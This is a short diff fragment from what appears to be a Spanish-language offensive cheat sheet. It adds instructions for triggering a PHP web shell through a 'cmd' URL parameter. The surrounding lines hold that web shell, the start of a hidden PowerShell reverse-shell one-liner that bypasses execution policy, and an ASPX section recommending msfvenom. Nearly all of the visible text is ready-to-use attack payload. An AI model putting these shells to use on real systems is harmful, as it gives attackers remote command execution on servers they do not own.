@@ -47,6 +47,11 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object Syst
 <?php system($_GET['cmd']); ?>
 ```
 
+En la web accedemos al parametro:
+```bash
+http://url/index.php?cmd=id
+```
+
 **ASPX (IIS):**
 Generar con msfvenom siempre es mejor, pero si necesitas una manual simple:
 ```aspx
